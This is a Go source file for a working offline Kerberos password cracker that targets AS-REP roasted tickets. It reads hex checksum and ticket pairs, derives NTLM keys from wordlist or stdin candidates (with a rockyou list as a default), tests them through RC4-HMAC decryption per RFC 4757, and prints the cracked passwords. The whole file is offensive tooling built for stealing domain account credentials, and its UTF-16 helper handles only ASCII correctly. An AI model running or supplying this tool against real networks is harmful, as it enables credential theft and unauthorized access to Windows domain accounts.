package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rc4"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
	"unicode/utf16"

	"golang.org/x/crypto/md4"
)

func getHmacMd5(data []byte, key []byte) []byte {
	mac := hmac.New(md5.New, key)
	mac.Write(data)
	return mac.Sum(nil)
}

func rc4Decrypt(encData []byte, key []byte) []byte {
	dst := make([]byte, len(encData))
	rc4cipher, err := rc4.NewCipher(key)

	if err != nil {
		fmt.Println(err)
	}

	rc4cipher.XORKeyStream(dst, encData)
	return dst
}

func testEq(a, b []byte) bool {

	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}

	return true
}

// Defined in RFC 4757: The RC4-HMAC Kerberos Encryption Types Used by Microsoft Windows
func decrypt(key []byte, messageType byte, job CrackingJob) bool {
	mtype := []byte{messageType, 0, 0, 0}

	K1 := getHmacMd5(mtype, key)
	K2 := K1 // Not necessary since we're not doing exports, but whatev
	K3 := getHmacMd5(job.checksum, K1)

	decData := rc4Decrypt(job.encTicket, K3)

	// TODO: (Optimization) Get rid of last HMAC. Instead verify domain or check for a consistent value in decrypted service ticket
	verifyChecksum := getHmacMd5(decData, K2)

	if testEq(verifyChecksum, job.checksum) {
		return true
	}

	return false
}

// src:https://github.com/ThomsonReutersEikon/go-ntlm
func zeroBytes(length int) []byte {
	return make([]byte, length, length)
}

// src:https://github.com/ThomsonReutersEikon/go-ntlm
func utf16FromString(s string) []byte {
	encoded := utf16.Encode([]rune(s))
	// TODO: I'm sure there is an easier way to do the conversion from utf16 to bytes
	result := zeroBytes(len(encoded) * 2)
	for i := 0; i < len(encoded); i++ {
		result[i*2] = byte(encoded[i])
		result[i*2+1] = byte(encoded[i] << 8)
	}
	return result
}

func getNtlm(password string) []byte {
	cipher := md4.New()
	cipher.Write(utf16FromString(password))
	return cipher.Sum(nil)
}

// Represents the info required for a cracking jab
type CrackingJob struct {
	filename  string // Name of the file where the data came from
	domain    string // Domain (Kerberos Realm)
	checksum  []byte // Checksum of encrypted ticket
	encTicket []byte // Encrypted ticket
	password  string // Cracked password
}

func parseCrackingJobFromString(str string) (CrackingJob, error) {
	var job CrackingJob
	var err error

	fields := strings.Split(str, ":")
	if len(fields) != 3 {
		return job, fmt.Errorf("Improper number of columns")
	}

	job.checksum, err = hex.DecodeString(fields[0])
	job.encTicket, err = hex.DecodeString(fields[1])
	job.filename = fields[2]

	return job, err
}

func parseCrackingJobFile(filename string) []CrackingJob {
	var jobs []CrackingJob

	file, err := os.Open(filename)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for i := 0; scanner.Scan(); i++ {
		line := scanner.Text()

		newJob, err := parseCrackingJobFromString(line)
		if err != nil {
			fmt.Printf("Failed to parse encrypted data on line %d: %s\n", i, err)
			continue
		}

		jobs = append(jobs, newJob)
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	return jobs
}

func crackTGS(input <-chan string, encData []CrackingJob) <-chan CrackingJob {
	out := make(chan CrackingJob)
	numJobs := len(encData)

	go func() {
	InputLoop:
		for password := range input {

			ntlm := getNtlm(password)

			for i := 0; i < numJobs; i++ {
				// message type 8 for AS-REP instead of type 2
				success := decrypt(ntlm, 8, encData[i])

				if success == true {
					encData[i].password = password
					out <- (encData[i])

					// Remove the job since it's been cracked
					if numJobs > 1 {
						encData = append(encData[:i], encData[i+1:]...)
						numJobs--
						i-- // Have to do this since I removed an item
						continue
					} else {
						break InputLoop
					}
				}
			}

		}
		close(out)
	}()

	return out
}

func displayResults(input <-chan CrackingJob) <-chan string {
	out := make(chan string)

	go func() {
		for job := range input {
			fmt.Printf("Cracked a password!  %s:%s\n", job.password, job.filename)
		}
		close(out)
	}()

	return out
}

func readLinesFromStdin() <-chan string {
	out := make(chan string)

	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Split(bufio.ScanLines)

		for scanner.Scan() {
			line := scanner.Text()
			out <- line
		}
		close(out)
	}()

	return out
}

func readLinesFromFile(filename string) <-chan string {
	out := make(chan string)

	go func() {
		file, err := os.Open(filename)
		if err != nil {
			log.Fatal(err)
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for i := 0; scanner.Scan(); i++ {
			line := scanner.Text()
			out <- line
		}

		if err := scanner.Err(); err != nil {
			log.Fatal(err)
		}

		close(out)
	}()

	return out
}

func getInputChannel(stdin bool) <-chan string {
	if stdin == true {
		return readLinesFromStdin()
	}

	return readLinesFromFile("rockyou1mil.txt")
}

func main() {
	hashFile := flag.String("hashfile", "hashes.txt", "Path to the hash file.")
	wordlist := flag.String("wordlist", "", "Path to wordlist file.  If not provided, stdin will be used instead")
	flag.Parse()

	fmt.Println("Starting tgscrack with the following settings:")
	fmt.Println("    hashFile:", *hashFile)
	fmt.Println("    wordlist:", *wordlist)

	var input <-chan string

	if *wordlist == "" {
		fmt.Println("Reading input from stdin...")
		input = readLinesFromStdin()
	} else {
		input = readLinesFromFile(*wordlist)
	}

	jobs := parseCrackingJobFile(*hashFile)
	crackedPasswords := crackTGS(input, jobs)

	fmt.Println()
	done := displayResults(crackedPasswords)

	<-done
	fmt.Println("\n*** Cracking has finished ***")
}
